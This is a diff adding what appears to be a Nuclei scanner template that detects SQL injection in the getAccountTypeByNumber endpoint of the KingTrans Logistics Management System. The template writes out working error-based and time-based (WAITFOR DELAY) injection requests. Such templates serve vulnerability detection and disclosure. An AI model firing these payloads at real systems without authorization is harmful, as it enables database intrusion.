@@ -1,0 +1,46 @@
+id: kingtrans-lms-sqli
+info:
+  name: KingTrans Logistics Management System SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    The KingTrans Logistics Management System is vulnerable to SQL Injection in the `getAccountTypeByNumber` endpoint, allowing potential attackers to execute arbitrary SQL queries.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /WebTrack?action=getAccountTypeByNumber&billid=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "系统错误"
+          - "java.sql.SQLException"
+
+  - raw:
+      - |
+        GET /WebTrack?action=getAccountTypeByNumber&billid='; WAITFOR DELAY '0:0:{{t1}}'-- - HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"Message":"未找到对应制单！"}'
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
